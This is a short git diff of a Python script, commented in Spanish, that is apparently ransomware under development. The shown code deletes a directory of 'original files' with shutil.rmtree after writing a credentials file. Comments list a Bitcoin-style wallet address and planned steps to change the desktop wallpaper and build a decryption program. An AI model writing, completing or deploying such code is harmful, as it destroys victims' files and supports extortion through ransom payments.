@@ -75,16 +75,19 @@ with open('credenciales.json', 'w') as file:
 del temp
 gc.collect()
 
-
-# wallet
-# 3QvVW4j9ZMneSFJVCnHDa7Ce3tpcrNieuF
-
-
+# borar archivos originales
 import shutil
-
-dirPath = '/archivos_orginales'
-
+dirPath = 'archivos_orginales'
 try:
     shutil.rmtree(dirPath)
 except OSError as e:
     print(f"Error:{ e.strerror}")
+
+# cambiar el fondo de escritorio    
+
+# hacer programa de descifrado
+
+# wallet
+# 3QvVW4j9ZMneSFJVCnHDa7Ce3tpcrNieuF
+
+# documentacion
